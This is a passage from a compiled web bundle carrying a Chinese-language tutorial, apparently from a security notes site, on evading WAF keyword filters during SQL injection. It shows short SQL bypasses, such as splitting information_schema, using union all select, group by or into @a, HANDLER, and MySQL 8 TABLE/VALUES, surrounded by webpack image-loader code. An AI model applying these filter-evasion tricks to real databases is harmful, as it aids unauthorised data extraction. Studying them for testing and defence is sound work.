\u5982\u679c\u8fc7\u6ee4\u7684\u5185\u5bb9\u4e2d\u95f4\u6709\u8fde\u63a5\u7b26",(0,c.jsx)(n.code,{children:"."}),"\uff0c\u6bd4\u5982\u8fc7\u6ee4",(0,c.jsx)(n.code,{children:"information_schema.tables"}),"\uff0c\u90a3\u4e48\u53ef\u4ee5\u901a\u8fc7\u7a7a\u683c\u6216\u8005\u53cd\u5f15\u53f7\u6765\u7ed5\u8fc7"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"-- \u7a7a\u683c\nselect distinct table_name from information_schema . tables;\n-- \u53cd\u5f15\u53f7\nselect distinct table_name from `information_schema`.`tables`;\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u5982\u679c\u662f\u6307\u5b9a\u4e86\u5173\u952e\u8bcd",(0,c.jsx)(n.code,{children:"union select"}),"\uff0c\u90a3\u4e48\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528",(0,c.jsx)(n.code,{children:"union all select"}),"\u548c",(0,c.jsx)(n.code,{children:"union distinct select"})]}),"\n",(0,c.jsxs)(n.p,{children:["\u800c\u6709\u4e9b\u6bd4\u8f83\u66b4\u529b\u7684WAF\u76f4\u63a5\u5bf9\u5173\u952e\u8bcd\u8fdb\u884c\u8fc7\u6ee4\uff0c\u6bd4\u5982\u51fa\u73b0",(0,c.jsx)(n.code,{children:"information_schema"}),"\u5c31\u8fc7\u6ee4\u6389"]}),"\n",(0,c.jsxs)(n.p,{children:["**\u7ed5\u8fc7\u65b9\u6cd5\uff1a**\u4f7f\u7528",(0,c.jsx)(n.code,{children:"\\n"}),"\uff0c",(0,c.jsx)(n.code,{children:"\\n"}),"\u4f1a\u88ab\u5f53\u6210null\uff0c\u5728\u8bed\u53e5\u4e2d\u6ca1\u5565\u5f71\u54cd"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"select table_name from informa\\n\\n\\ntion_sch\\n\\n\\nema.tables;\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u4e5f\u53ef\u4ee5\u66ff\u6362\u5173\u952e\u8bcd\uff0c\u5982\u4e0d\u4f7f\u7528",(0,c.jsx)(n.code,{children:"information_schema"}),"\uff0c\u800c\u662f\u4f7f\u7528",(0,c.jsx)(n.code,{children:"innodb_table_stats"}),"\u7b49\uff0c\u8be6\u89c1\uff1a",(0,c.jsx)(n.a,{href:"./innodb%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E",children:"innodb\u5b58\u50a8\u5f15\u64ce"})]}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7order-by",children:"\u7ed5\u8fc7order by"}),"\n",(0,c.jsxs)(n.p,{children:["\u9664\u4e86",(0,c.jsx)(n.a,{href:"#%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E8%AF%8D",children:"\u7ed5\u8fc7\u5173\u952e\u8bcd"}),"\u624b\u6cd5\uff0c\u8fc7\u6ee4\u4e86",(0,c.jsx)(n.code,{children:"order by"}),"\uff0c\u8fd8\u53ef\u4ee5\u8003\u8651\u4f7f\u7528",(0,c.jsx)(n.code,{children:"group by"})]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"select * from user order by 1;\nselect * from user group by 1;\n"})}),"\n",(0,c.jsxs)(n.p,{children:["\u4e5f\u53ef\u4ee5\u4f7f\u7528",(0,c.jsx)(n.code,{children:"into"}),"\u53d8\u91cf\u540d\u8fdb\u884c\u66ff\u4ee3"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"select * from user where age=111 into @a;\nselect * from user where age=111 into @a,@b;\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220308135332589",src:s(14453).A+"",width:"1672",height:"544"})}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7select",children:"\u7ed5\u8fc7select"}),"\n",(0,c.jsx)(n.admonition,{type:"note",children:(0,c.jsx)(n.p,{children:"\u4e2a\u4eba\u611f\u89c9\u975e\u5e38\u9e21\u808b"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsxs)(n.strong,{children:["1\u3001\u53ef\u4ee5\u4f7f\u7528",(0,c.jsx)(n.code,{children:"handler"})]})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"HANDLER tbl_name OPEN [ [AS] alias]\n\nHANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }\n    [ WHERE where_condition ] [LIMIT ... ]\nHANDLER tbl_name READ { FIRST | NEXT }\n    [ WHERE where_condition ] [LIMIT ... ]\n\nHANDLER tbl_name CLOSE\n"})}),"\n",(0,c.jsx)(n.p,{children:"**\u4e3e\u4f8b\uff1a**\u6ca1\u627e\u5230\u5b9e\u9645\u5229\u7528\u573a\u666f"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"-- user\u662f\u8868\u540d\n-- \u6253\u5f00\u53e5\u67c4\nhandler user open;\n-- \u8bfb\u53d6\u6570\u636e\nhandler user read first;\nhandler user read next;\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220120161141602",src:s(80722).A+"",width:"764",height:"810"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsxs)(n.strong,{children:["2\u3001",(0,c.jsx)(n.code,{children:"mysql8.0.19+"}),"\u4f7f\u7528",(0,c.jsx)(n.code,{children:"table"}),"\u548c",(0,c.jsx)(n.code,{children:"values"}),"\u5173\u952e\u8bcd"]})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]\n\ntable user;\n-- \u7b49\u4ef7\u4e8e\nselect * from user;\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220120164337350",src:s(16040).A+"",width:"538",height:"360"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]\n \nrow_constructor_list:\n    ROW(value_list)[, ROW(value_list)][, ...]\n \nvalue_list:\n    value[, value][, ...]\n \ncolumn_designator: \n    column_index\n    \n    \nvalues row(1,2) union select * from user;\n-- \u7b49\u540c\u4e8e\nselect 1,2 union select * from user;\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220120164628634",src:s(24704).A+"",width:"994",height:"470"})})]})}function o(e={}){const{wrapper:n}={...(0,d.R)(),...e.components};return n?(0,c.jsx)(n,{...e,children:(0,c.jsx)(h,{...e})}):h(e)}},3770:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220120144327470-1e1e9314729a30a9a7c4713c98cbb0f6.png"},6461:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220125104250431-b3718235a554830e389e3080f5b84738.png"},14453:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220308135332589-ccaa3db9b9b9661ab8833e3158e313ad.png"},16040:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220120164337350-4d82172d7e796fc0c5a6450fd741aee0.png"},24704:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220120164628634-937ee765222b3c049f54cb9217255520.png"},28453:(e,n,s)=>{s.d(n,{R:()=>t,x:()=>r});var l=s(96540);const c={},d=l.createContext(c);function t(e){const n=l.useContext(d);return l.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function r(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(c):e.components||c:t(e.components),l.createElement(d.Provider,{value:n},e.children)}},28595:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220120144651929-b28dd756aa127b5c60ba3a66521edc50.png"},46445:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220120144010351-4e26cab5658416c8201bc36c232e7ffd.png"},55021:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220125104519275-c254b911f15e9fba0ce49900fe4cb850.png"},59576:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220125102843243-a128526533fabd87983e1bc4c340e99b.png"},80722:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220120161141602-30a48dc79c8189586d79bb37edbd6178.png"},89185:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image-20220125104854147-e5951a75cd8e29f72f53c89eec2e21a0.png"},95347:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/1011652-20170416163043227-1936139924-cefc2e136012ef7f7387db0704374ef3.png"}}]);